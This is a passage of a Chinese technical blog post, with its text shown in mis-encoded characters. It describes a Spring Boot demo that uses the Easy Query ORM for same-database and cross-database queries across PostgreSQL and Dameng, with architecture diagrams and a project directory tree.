                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">é¡¹ç›®ç®€ä»‹</h2>
<p><code>easy-query-demo</code> æ˜¯ä¸€ä¸ªåŸºäº Spring Boot çš„åŒåº“åŒè¡¨å¤šæ•°æ®æºæŸ¥è¯¢é¡¹ç›®ï¼Œæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ <strong>Easy Query ORM æ¡†æ¶</strong>å®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š</p>
<ol>
<li><strong>åŒåº“è”åˆæŸ¥è¯¢</strong> - åœ¨å•ä¸ªæ•°æ®åº“å†…è¿›è¡Œè¡¨å…³è”æŸ¥è¯¢</li>
<li><strong>è·¨åº“è”åˆæŸ¥è¯¢</strong> - è·¨è¶Šä¸¤ä¸ªæ•°æ®åº“è¿›è¡Œæ•°æ®å…³è”</li>
<li><strong>åŠ¨æ€æ•°æ®æºåˆ‡æ¢</strong> - ä½¿ç”¨æ³¨è§£æ–¹å¼åŠ¨æ€åˆ‡æ¢æ•°æ®æº</li>
<li><strong>æ•°æ®åº“å‡½æ•°é€‚é…</strong> - è‡ªåŠ¨é€‚é…ä¸åŒæ•°æ®åº“çš„ SQL æ–¹è¨€å·®å¼‚</li>
</ol>
<h3 data-id="heading-1">æ•°æ®åº“æ¶æ„</h3>
<p>æœ¬é¡¹ç›®é‡‡ç”¨<strong>åŒåº“åŒè¡¨æ¶æ„</strong>ï¼Œæ¯ä¸ªæ•°æ®åº“éƒ½åŒ…å«å®Œæ•´çš„ç”¨æˆ·å’Œäº§å“æ•°æ®ï¼š</p>























<table><thead><tr><th>æ•°æ®åº“</th><th>ç”¨æˆ·è¡¨</th><th>äº§å“è¡¨</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td><strong>PostgreSQL</strong></td><td><code>t_user</code></td><td><code>t_product</code></td><td>ä¸»ä¸šåŠ¡åº“ï¼ˆå°å†™è¡¨åï¼‰</td></tr><tr><td><strong>è¾¾æ¢¦æ•°æ®åº“</strong></td><td><code>T_USER</code></td><td><code>T_PRODUCT</code></td><td>å›½äº§æ•°æ®åº“ï¼ˆå¤§å†™è¡¨åï¼‰</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">æ ¸å¿ƒç‰¹æ€§</h2>
<h3 data-id="heading-3">1. ä¸‰ç§æŸ¥è¯¢æ¨¡å¼</h3>

























<table><thead><tr><th>æ¨¡å¼</th><th>è¯´æ˜</th><th>API å‰ç¼€</th></tr></thead><tbody><tr><td><strong>PostgreSQL åŒåº“æŸ¥è¯¢</strong></td><td>åœ¨ PostgreSQL å†…å…³è” <code>t_user</code> å’Œ <code>t_product</code></td><td><code>/api/query/pg/*</code></td></tr><tr><td><strong>è¾¾æ¢¦åŒåº“æŸ¥è¯¢</strong></td><td>åœ¨è¾¾æ¢¦å†…å…³è” <code>T_USER</code> å’Œ <code>T_PRODUCT</code></td><td><code>/api/query/dm/*</code></td></tr><tr><td><strong>è·¨åº“è”åˆæŸ¥è¯¢</strong></td><td>PostgreSQL ä¸è¾¾æ¢¦ä¹‹é—´çš„æ•°æ®å…³è”</td><td><code>/api/query/cross/*</code></td></tr></tbody></table>
<h3 data-id="heading-4">2. åŠ¨æ€æ•°æ®æºåˆ‡æ¢</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨æ³¨è§£æ–¹å¼åˆ‡æ¢æ•°æ®æº</span>
<span class="hljs-meta">@DataSource(DataSourceType.POSTGRESQL)</span>
<span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">queryPostgreSQL</span><span class="hljs-params">()</span> { ... }

<span class="hljs-meta">@DataSource(DataSourceType.DAMENG)</span>
<span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">queryDameng</span><span class="hljs-params">()</span> { ... }
</code></pre>
<h3 data-id="heading-5">3. æ•°æ®åº“å‡½æ•°é€‚é…</h3>
<p>è‡ªåŠ¨é€‚é…ä¸åŒæ•°æ®åº“çš„ SQL æ–¹è¨€å·®å¼‚ï¼š</p>

























<table><thead><tr><th>å‡½æ•°</th><th>PostgreSQL</th><th>è¾¾æ¢¦æ•°æ®åº“</th></tr></thead><tbody><tr><td>å­—ç¬¦ä¸²è¿æ¥</td><td><code>a||b</code></td><td><code>a + b</code></td></tr><tr><td>å½“å‰æ—¶é—´</td><td><code>CURRENT_TIMESTAMP</code></td><td><code>CURRENT_TIMESTAMP</code></td></tr><tr><td>æ—¥æœŸæ ¼å¼åŒ–</td><td><code>TO_CHAR()</code></td><td><code>TO_CHAR()</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-6">é¡¹ç›®æ¶æ„</h2>
<h3 data-id="heading-7">åˆ†å±‚æ¶æ„</h3>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     Controller Layer                            â”‚
â”‚          UnifiedQueryController / FederatedQueryController      â”‚
â”‚              (REST API Endpoints)                                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      Service Layer                               â”‚
â”‚   SameDatabaseJoinService / FederatedQueryService               â”‚
â”‚    (Business Logic, Parallel Query, Data Combination)            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    Repository Layer                              â”‚
â”‚    UserRepository / ProductRepository / PgProductRepository       â”‚
â”‚         (Data Access with Easy Query)                            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                   Entity Layer                                   â”‚
â”‚    User / Product / PgUser / PgProduct / DmUser / DmProduct      â”‚
â”‚            (Domain Models &amp; Proxy Classes)                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              Data Source &amp; Adapter Layer                        â”‚
â”‚   DynamicDataSource / DataSourceAspect / DatabaseFunctionAdapter  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚                                                        â”‚
    â–¼                                                        â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   PostgreSQL    â”‚                              â”‚   Dameng DB     â”‚
â”‚   :<span class="hljs-number">5432</span>         â”‚                              â”‚   :<span class="hljs-number">5236</span>         â”‚
â”‚                 â”‚                              â”‚                 â”‚
â”‚ t_user +        â”‚                              â”‚ T_USER +        â”‚
â”‚ t_product       â”‚                              â”‚ T_PRODUCT       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-8">é¡¹ç›®ç›®å½•ç»“æ„</h3>
<pre><code class="hljs language-bash" lang="bash">easy-query-demo/
â”œâ”€â”€ pom.xml                                          <span class="hljs-comment"># Maven é…ç½®</span>
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ main/
â”‚   â”‚   â”œâ”€â”€ java/com/demo/easyquery/
â”‚   â”‚   â”‚   â”œâ”€â”€ EasyQueryApplication.java             <span class="hljs-comment"># å¯åŠ¨ç±»</span>
â”‚   â”‚   â”‚   â”‚
â”‚   â”‚   â”‚   â”œâ”€â”€ config/                               <span class="hljs-comment"># é…ç½®å±‚</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ datasource/
â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ DataSourceType.java          <span class="hljs-comment"># æ•°æ®æºç±»å‹æšä¸¾</span>
â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ DataSourceContextHolder.java <span class="hljs-comment"># æ•°æ®æºä¸Šä¸‹æ–‡</span>
â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ DynamicDataSource.java        <span class="hljs-comment"># åŠ¨æ€æ•°æ®æº</span>
â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ @DataSource.java              <span class="hljs-comment"># æ•°æ®æºåˆ‡æ¢æ³¨è§£</span>
â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€â”€ DataSourceAspect.java         <span class="hljs-comment"># AOP åˆ‡é¢</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ adapter/
â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ DatabaseType.java             <span class="hljs-comment"># æ•°æ®åº“ç±»å‹</span>
â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ DatabaseFunctionAdapter.java  <span class="hljs-comment"># å‡½æ•°é€‚é…å™¨æ¥å£</span>
â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ PostgreSQLFunctionAdapter.java
â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ DamengFunctionAdapter.java
â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€â”€ DatabaseFunctionAdapterFactory.java
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ DataSourceConfig.java            <span class="hljs-comment"># åŒæ•°æ®æºé…ç½®</span>
â”‚   â”‚   â”‚   â”‚   â””â”€â”€ EasyQueryConfig.java              <span class="hljs-comment"># EasyQuery å®ä¾‹é…ç½®</span>
â”‚   â”‚   â”‚   â”‚
â”‚   â”‚   â”‚   â”œâ”€â”€ entity/                               <span class="hljs-comment"># å®ä½“å±‚</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ User.java                         <span class="hljs-comment"># é€šç”¨ç”¨æˆ·å®ä½“</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ Product.java                      <span class="hljs-comment"># é€šç”¨äº§å“å®ä½“</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ pg/
â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ PgUser.java                  <span class="hljs-comment"># PostgreSQL ç”¨æˆ·å®ä½“</span>
â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€â”€ PgProduct.java               <span class="hljs-comment"># PostgreSQL äº§å“å®ä½“</span>
â”‚   â”‚   â”‚   â”‚   â””â”€â”€ dm/
â”‚   â”‚   â”‚   â”‚       â”œâ”€â”€ DmUser.java                  <span class="hljs-comment"># è¾¾æ¢¦ç”¨æˆ·å®ä½“</span>
â”‚   â”‚   â”‚   â”‚       â””â”€â”€ DmProduct.java               <span class="hljs-comment"># è¾¾æ¢¦äº§å“å®ä½“</span>
â”‚   â”‚   â”‚   â”‚
â”‚   â”‚   â”‚   â”œâ”€â”€ repository/                           <span class="hljs-comment"># æ•°æ®è®¿é—®å±‚</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ pg/
â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ UserRepository.java          <span class="hljs-comment"># PG ç”¨æˆ·ä»“å‚¨</span>
â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€â”€ PgProductRepository.java     <span class="hljs-comment"># PG äº§å“ä»“å‚¨</span>
â”‚   â”‚   â”‚   â”‚   â””â”€â”€ dm/
â”‚   â”‚   â”‚   â”‚       â”œâ”€â”€ DmUserRepository.java         <span class="hljs-comment"># DM ç”¨æˆ·ä»“å‚¨</span>
â”‚   â”‚   â”‚   â”‚       â””â”€â”€ ProductRepository.java       <span class="hljs-comment"># DM äº§å“ä»“å‚¨</span>
â”‚   â”‚   â”‚   â”‚
â”‚   â”‚   â”‚   â”œâ”€â”€ service/                              <span class="hljs-comment"># ä¸šåŠ¡å±‚</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ SameDatabaseJoinService.java      <span class="hljs-comment"># åŒåº“å…³è”æŸ¥è¯¢</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ FederatedQueryService.java        <span class="hljs-comment"># è·¨åº“è”åˆæŸ¥è¯¢</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ DynamicDataSourceService.java      <span class="hljs-comment"># åŠ¨æ€æ•°æ®æºæ¼”ç¤º</span>
â”‚   â”‚   â”‚   â”‚   â””â”€â”€ UserService.java
â”‚   â”‚   â”‚   â”‚
â”‚   â”‚   â”‚   â”œâ”€â”€ controller/                           <span class="hljs-comment"># æ§åˆ¶å±‚</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ UnifiedQueryController.java        <span class="hljs-comment"># ç»Ÿä¸€æŸ¥è¯¢æ§åˆ¶å™¨</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ FederatedQueryController.java     <span class="hljs-comment"># è”é‚¦æŸ¥è¯¢æ§åˆ¶å™¨</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ SameDatabaseJoinController.java   <span class="hljs-comment"># åŒåº“å…³è”æŸ¥è¯¢æ§åˆ¶å™¨</span>
â”‚   â”‚   â”‚   â”‚   â””â”€â”€ MultiDataSourceController.java    <span class="hljs-comment"># å¤šæ•°æ®æºæ§åˆ¶å™¨</span>
â”‚   â”‚   â”‚   â”‚
â”‚   â”‚   â”‚   â”œâ”€â”€ dto/                                 <span class="hljs-comment"># æ•°æ®ä¼ è¾“å¯¹è±¡</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ UserProductDTO.java              <span class="hljs-comment"># PG ç”¨æˆ·äº§å“å…³è” DTO</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ UserProductStatsDTO.java         <span class="hljs-comment"># PG ç”¨æˆ·äº§å“ç»Ÿè®¡ DTO</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ ProductBuyerStatsDTO.java        <span class="hljs-comment"># PG äº§å“ä¹°å®¶ç»Ÿè®¡ DTO</span>
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ DmUserProductDTO.java            <span class="hljs-comment"># DM ç”¨æˆ·äº§å“å…³è” DTO</span>
â”‚   â”‚   â”‚   â”‚   â””â”€â”€ DmProductBuyerStatsDTO.java      <span class="hljs-comment"># DM äº§å“ä¹°å®¶ç»Ÿè®¡ DTO</span>
â”‚   â”‚   â”‚   â”‚
â”‚   â”‚   â”‚   â””â”€â”€ dto/proxy/                           <span class="hljs-comment"># DTO ä»£ç†ç±»ï¼ˆAPT ç”Ÿæˆï¼‰</span>
â”‚   â”‚   â”‚       â”œâ”€â”€ UserProductDTOProxy.java
â”‚   â”‚   â”‚       â”œâ”€â”€ UserProductStatsDTOProxy.java
â”‚   â”‚   â”‚       â”œâ”€â”€ ProductBuyerStatsDTOProxy.java
â”‚   â”‚   â”‚       â”œâ”€â”€ DmUserProductDTOProxy.java
â”‚   â”‚   â”‚       â””â”€â”€ DmProductBuyerStatsDTOProxy.java
â”‚   â”‚   â”‚
â”‚   â”‚   â””â”€â”€ resources/
â”‚   â”‚       â”œâ”€â”€ application.properties
â”‚   â”‚       â””â”€â”€ application-datasource.properties
â”‚   â”‚
â”‚   â””â”€â”€ <span class="hljs-built_in">test</span>/                                          <span class="hljs-comment"># æµ‹è¯•ä»£ç </span>
â”‚       â””â”€â”€ java/com/demo/easyquery/
â”‚           â”œâ”€â”€ FederatedQueryServiceTest.java
â”‚           â”œâ”€â”€ MultiDataSourceTest.java
â”‚           â””â”€â”€ DatabaseComparisonTest.java
</code></pre>
<hr/>
<h2 data-id="heading-9">æ¶æ„ 4+1 è§†å›¾</h2>
<h3 data-id="heading-10">1. é€»è¾‘è§†å›¾ (Logical View)</h3>
<p>æè¿°ç³»ç»Ÿçš„åŠŸèƒ½ç»„ä»¶å’Œå®ƒä»¬ä¹‹é—´çš„å…³ç³»ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "API Layer"
        UC[UnifiedQueryController&lt;br/&gt;ç»Ÿä¸€æŸ¥è¯¢æ¥å£]
        FQC[FederatedQueryController&lt;br/&gt;è”é‚¦æŸ¥è¯¢æ¥å£]
    end

    subgraph "Service Layer"
        SDS[SameDatabaseJoinService&lt;br/&gt;åŒåº“å…³è”æŸ¥è¯¢]
        FQS[FederatedQueryService&lt;br/&gt;è·¨åº“è”åˆæŸ¥è¯¢]
    end

    subgraph "Repository Layer"
        UR[UserRepository]
        PR[ProductRepository]
        PgPR[PgProductRepository]
        DmUR[DmUserRepository]
    end

    subgraph "Entity Layer"
        U[User / PgUser / DmUser]
        P[Product / PgProduct / DmProduct]
    end

    subgraph "Data Source Layer"
        PG[(PostgreSQL&lt;br/&gt;t_user + t_product)]
        DM[(Dameng DB&lt;br/&gt;T_USER + T_PRODUCT)]
    end

    UC --&gt; SDS
    UC --&gt; FQS
    FQC --&gt; FQS

    SDS --&gt; UR
    SDS --&gt; PgPR
    SDS --&gt; DmUR
    SDS --&gt; PR

    FQS --&gt; UR
    FQS --&gt; PR

    UR --&gt; PG
    PgPR --&gt; PG
    DmUR --&gt; DM
    PR --&gt; DM

    style PG fill:#6495ED
    style DM fill:#DC143C
</code></pre>
<h3 data-id="heading-11">2. å®ç°è§†å›¾ (Implementation View)</h3>
<p>æè¿°ç³»ç»Ÿçš„ä»£ç ç»“æ„å’Œæ¨¡å—ç»„ç»‡ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    subgraph Controller [Controller Layer]
        UC[UnifiedQueryController]
        FQC[FederatedQueryController]
    end

    subgraph Service [Service Layer]
        SDS[SameDatabaseJoinService]
        FQS[FederatedQueryService]
    end

    subgraph Repository [Repository Layer]
        UR[UserRepository]
        PR[ProductRepository]
        PgPR[PgProductRepository]
        DmUR[DmUserRepository]
    end

    subgraph Entity [Entity Layer]
        U[User]
        P[Product]
        PgU[PgUser]
        PgP[PgProduct]
        DmU[DmUser]
        DmP[DmProduct]
    end

    UC --&gt; SDS
    FQC --&gt; FQS
    SDS --&gt; UR
    SDS --&gt; PgPR
    SDS --&gt; DmUR
    SDS --&gt; PR
    FQS --&gt; UR
    FQS --&gt; PR

    UR --&gt; U
    UR --&gt; PgU
    PgPR --&gt; PgP
    DmUR --&gt; DmU
    PR --&gt; P
    PR --&gt; DmP
</code></pre>
<h3 data-id="heading-12">3. è¿›ç¨‹è§†å›¾ (Process View)</h3>
<p>æè¿°ç³»ç»Ÿçš„å¹¶å‘å’ŒåŒæ­¥æœºåˆ¶ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant Client
    participant Controller
    participant Service
    participant PGRepo as PG Repository
    participant DMRepo as DM Repository
    participant PG as PostgreSQL
    participant DM as Dameng DB

    Client-&gt;&gt;Controller: GET /api/query/pg/affordable-products
    Controller-&gt;&gt;Service: queryPgUserAffordableProducts()

    Service-&gt;&gt;PGRepo: queryable(PgUser.class)
    PGRepo-&gt;&gt;PG: SELECT * FROM t_user
    PG--&gt;&gt;PGRepo: List&lt;PgUser&gt;

    Service-&gt;&gt;PGRepo: queryable(PgProduct.class)
    PGRepo-&gt;&gt;PG: SELECT * FROM t_product
    PG--&gt;&gt;PGRepo: List&lt;PgProduct&gt;

    Service-&gt;&gt;Service: ç»„åˆç»“æœ
    Service--&gt;&gt;Controller: List&lt;Map&gt;
    Controller--&gt;&gt;Client: JSON Response

    Note over Client,DM: PostgreSQL åŒåº“æŸ¥è¯¢å®Œæˆ

    Client-&gt;&gt;Controller: GET /api/query/dm/purchasing-power
    Controller-&gt;&gt;Service: analyzeDmPurchasingPower()

    Service-&gt;&gt;DMRepo: queryable(DmUser.class)
    DMRepo-&gt;&gt;DM: SELECT * FROM T_USER
    DM--&gt;&gt;DMRepo: List&lt;DmUser&gt;

    Service-&gt;&gt;DMRepo: queryable(DmProduct.class)
    DMRepo-&gt;&gt;DM: SELECT * FROM T_PRODUCT
    DM--&gt;&gt;DMRepo: List&lt;DmProduct&gt;

    Service-&gt;&gt;Service: ç»„åˆç»“æœ
    Service--&gt;&gt;Controller: List&lt;Map&gt;
    Controller--&gt;&gt;Client: JSON Response

    Note over Client,DM: è¾¾æ¢¦åŒåº“æŸ¥è¯¢å®Œæˆ

    Client-&gt;&gt;Controller: GET /api/query/cross/compare
    Controller-&gt;&gt;Service: compareDataBetweenDatabases()

    par å¹¶è¡ŒæŸ¥è¯¢ä¸¤ä¸ªæ•°æ®åº“
        Service-&gt;&gt;PGRepo: count() + sumBalance()
    and
        Service-&gt;&gt;DMRepo: count() + sumBalance()
    end

    Service-&gt;&gt;Service: è®¡ç®—å·®å¼‚
    Service--&gt;&gt;Controller: Map
    Controller--&gt;&gt;Client: JSON Response

    Note over Client,DM: è·¨åº“è”åˆæŸ¥è¯¢å®Œæˆ
</code></pre>
<h3 data-id="heading-13">4. éƒ¨ç½²è§†å›¾ (Deployment View)</h3>
<p>æè¿°ç³»ç»Ÿçš„ç‰©ç†éƒ¨ç½²æ¶æ„ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "Client Layer"
        Browser[Web Browser]
        RestClient[REST Client]
    end

    subgraph "Application Server"
        App[Spring Boot App&lt;br/&gt;Port: 8080&lt;br/&gt;JDK 21]
    end

    subgraph "Database Layer"
        subgraph "PostgreSQL Server"
            PGDB[(PostgreSQL :5432&lt;br/&gt;Database: ins_bus&lt;br/&gt;Tables:&lt;br/&gt;- t_user&lt;br/&gt;- t_product)]
        end

        subgraph "Dameng Database Server"
